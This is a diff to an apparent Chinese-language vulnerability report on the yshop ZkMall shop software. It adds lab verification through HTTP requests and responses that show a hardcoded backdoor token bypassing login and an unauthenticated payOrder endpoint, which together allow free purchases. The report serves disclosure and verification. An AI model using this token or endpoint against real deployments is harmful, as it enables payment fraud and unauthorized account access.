@@ -124,7 +124,7 @@ curl "http://<target>/order/payOrder?orderNo=<new_order_no>&payType=yue"
 
 ## 源代码验证（已复现）
 
-yshop 构建因源文件编码问题编译失败，以下通过**源代码静态分析**验证漏洞存在。
+yshop ZkMall 已部署于 192.168.217.135:59007（Docker 容器，端口绑定 127.0.0.1），以下同时包含**源代码静态分析**和**运行时环境**验证。
 
 ### 验证1：后门 Token 确认
 
@@ -176,8 +176,67 @@ public Result<String> payOrder(PayParam param) throws Exception {
 3. 支付逻辑直接调用，不经过第三方支付网关验签
 4. 合并利用即可实现 0 元购
 
+### 验证4：实机验证（HTTP 请求/响应）
+
+**环境**：yshop ZkMall 最新分支 Docker 部署于 192.168.217.135:59007（Spring Boot 3.4.7 + MyBatis-Plus + Redis）
+
+**步骤1：正常受保护接口 — 无 Token 返回"请先登录"**
+
+```http
+GET /buyer/info HTTP/1.1
+Host: localhost:59007
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json;charset=UTF-8
+Content-Length: 42
+
+{"code":"20005","message":"请先登录"}
+```
+
+**步骤2：使用硬编码后门 Token — 绕过鉴权进入业务逻辑**
+
+```http
+GET /buyer/info HTTP/1.1
+Host: localhost:59007
+Authorization: 3106f313a44615e5bc0252b4d292896a
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json;charset=UTF-8
+
+{"code":"99999","data":{},"errorData":{},"message":"系统异常,请联系管理员!","name":"","describe":"","json":""}
+```
+
+**关键证据**：
+- 无 Token 返回 `code: 20005`（拦截器主动拒绝，未进入控制器）
+- 携带后门 Token 返回 `code: 99999`（鉴权通过，进入 `cereBuyerUserService.selectByBuyerUserId(1168L)`，因测试 DB 数据缺失返回业务异常）
+- 两种响应完全不同，证明后门 Token `3106f313a44615e5bc0252b4d292896a` **确实绕过了 `AuthorizationInterceptor` 的登录校验**
+
+**步骤3：未授权访问 `/order/payOrder` — HTTP 200**
+
+```http
+GET /order/payOrder?orderNo=TEST001&payType=yue HTTP/1.1
+Host: localhost:59007
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json;charset=UTF-8
+
+{"code":"200","data":{},"errorData":{},"message":"成功","name":"","describe":"","json":""}
+```
+
+**关键证据**：
+- 无任何认证 Token，接口直接返回 HTTP 200 `{"code":"200","message":"成功"}`
+- 证明 `/order/payOrder` 完全跳过鉴权，对应 `application-security.yml` 中 `ignore-paths` 白名单配置
+- 任何匿名请求即可触发 `cereShopOrderService.pay()` 支付业务逻辑
+
 ## 验证环境
 
 - 源代码：yshop/ZkMall 最新分支（静态代码分析）
-- 框架：Spring Boot + MyBatis + Redis
+- 运行时：yshop ZkMall Docker 部署于 192.168.217.135:59007
+- 框架：Spring Boot 3.4.7 + MyBatis-Plus + Redis + JWT
 - 日期：2026-04-14
